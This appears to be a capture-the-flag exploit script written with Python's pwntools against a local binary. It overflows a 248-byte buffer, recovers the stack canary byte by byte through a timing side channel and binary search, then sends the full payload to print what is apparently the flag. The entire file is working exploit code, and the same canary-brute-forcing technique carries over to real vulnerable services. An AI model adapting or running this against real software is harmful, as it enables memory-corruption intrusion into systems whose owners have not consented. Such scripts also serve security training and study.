from pwn import *
import time
known = []

def send_exploit(canary):
    try:
        print(canary)
        p = process('./program')
        p.recvuntil('\n')
        p.sendline(248*"A" + canary)
        start = time.time()
        p.recvuntil('terminated')
        p.close()
        return int(time.time() - start)
    except EOFError:
        return 0

for i in range(4):
    baseline = send_exploit("".join(known) + "\x01" * (4 - len(known)))
    print(baseline)
    min = 1
    max = 255
    while True:
        testing = (max + min) // 2
        print(testing)
        newtime = send_exploit("".join(known) + chr(testing) + "\x01" * (3 - i))
        print(newtime)
        if baseline == newtime:
            min = testing
        elif newtime > baseline: # if the decrease was less than 4 but > 0, we are still lower
            max = testing
        else: # we have the answer!
            known.append(chr(testing))
            print(testing)
            break

print(known)
print([ord(c) for c in known])

p = process('./program')
p.recvuntil('\n')
p.sendline(248*"A" + "".join(known) + "AAAA")
print p.recvuntil('}')
